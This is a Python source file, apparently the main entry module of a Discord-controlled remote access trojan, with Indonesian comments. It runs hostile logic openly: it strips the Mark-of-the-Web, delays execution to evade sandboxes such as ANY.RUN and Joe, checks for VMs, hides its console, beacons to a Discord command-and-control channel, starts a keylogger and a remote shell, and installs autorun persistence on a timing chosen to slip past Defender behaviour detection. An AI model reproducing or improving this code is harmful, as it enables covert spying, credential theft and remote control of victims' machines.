"""core/main.py — entrypoint payload.

Urutan: tunggu acak -> guard analisis -> mutex -> sembunyiin console ->
check-in -> baru persistensi -> polling.

Persistensi sengaja DIPINDAH ke belakang check-in. Versi lama nulis
autorun duluan, jadi kalau token salah atau jaringan mati, yang tertinggal
di mesin korban cuma sampah: exe di %LOCALAPPDATA% plus entri Run yang
nolong tiap logon. Sekarang nggak ada file yang ditulis sampai channel
Discord benar-benar jawab.
"""

import os
import random
import sys
import threading
import time

from . import caps, cmd, config, evade, net, persist


def _log_path():
    base = os.getenv("LOCALAPPDATA") or os.getenv("TEMP") or "."
    return os.path.join(base, "Programs", config.UUID[:8], ".log")


def _deferred_persist(bot):
    """Pasang autostart 2-5 menit setelah proses lahir, bukan di detik ke-10.

    Yang dihindari: jendela perilaku. Defender (dan sandbox mana pun) menilai
    sebuah proses dari apa yang dilakukannya di menit pertama. Exe yang
    langsung menyalin diri ke %LOCALAPPDATA% lalu menulis nilai Run adalah
    kombinasi yang paling sering memicu Behavior:Win32/Execution.
    Menunda tidak membuat perilakunya hilang, cuma membuatnya tidak lagi
    berimpit dengan eksekusi awal yang sedang diawasi.
    """
    time.sleep(random.uniform(120.0, 300.0))
    try:
        st = persist.install(config.NAME, task=getattr(config, "TASK", False))
    except Exception as exc:
        st = "gagal: %s: %s" % (type(exc).__name__, exc)
    try:
        bot.send("persist: %s" % st)
    except Exception:
        pass


def run():
    name = config.UUID[:8]

    # File yang datang lewat browser membawa Zone.Identifier. Selama stream
    # itu ada, tiap eksekusi diperiksa cloud dan file-nya diperlakukan
    # sebagai konten internet. Dibuang di sini, sebelum apa pun.
    try:
        own = persist.self_path()
        if own:
            evade.strip_motw(own)
    except Exception:
        pass

    # Jeda acak sebelum satu pun syscall menarik. Sandbox cepat (ANY.RUN,
    # Cape, Joe) rata-rata nyari perilaku di 10-30 detik pertama; yang
    # nggak muncul di jendela itu biasanya lolos ke karantina "clean".
    time.sleep(random.uniform(3.0, 12.0))

    if not evade.guard(config.ANTI_VM):
        return

    if evade.single_instance("k1-" + name) is None:
        return

    evade.hide_console()

    bot = net.Discord(config.TOKEN, config.CHANNEL, config.UUID,
                      getattr(config, "ALIAS", None))
    while not bot.prime():
        time.sleep(random.uniform(30, 90))

    # Status persistensi dilaporkan belakangan, dari thread-nya sendiri.
    # Versi sebelumnya menelan semua exception di sini, jadi kalau autorun
    # gagal terpasang, satu-satunya cara tahu adalah menebak dari mesin yang
    # direstart. Sekarang kegagalannya muncul di channel sebagai baris
    # "persist:".
    pstat = "pending" if config.PERSIST else "off"

    state = {"sleep": config.POLL}
    kl = caps.Keylogger(_log_path())
    shell = caps.Shell()
    router = cmd.Dispatcher(bot, shell, kl, config.NAME, state)

    bot.send("online | %s | %s\npersist: %s"
             % (caps.sysinfo().splitlines()[0], bot.alias, pstat))

    if config.PERSIST:
        threading.Thread(target=_deferred_persist, args=(bot,),
                         daemon=True).start()

    while True:
        try:
            for msg in bot.poll():
                router.handle(msg)
        except Exception:
            # Satu perintah gagal jangan matiin loop.
            time.sleep(5)
        try:
            caps.no_sleep()
        except Exception:
            pass
        # Jitter 0-1.5 detik: interval tetap 3.000 detik itu pola yang
        # kelihatan di flow log mana pun. Ini nggak, karena rata-ratanya
        # bergeser tiap request.
        time.sleep(state["sleep"] + random.random() * 1.5)
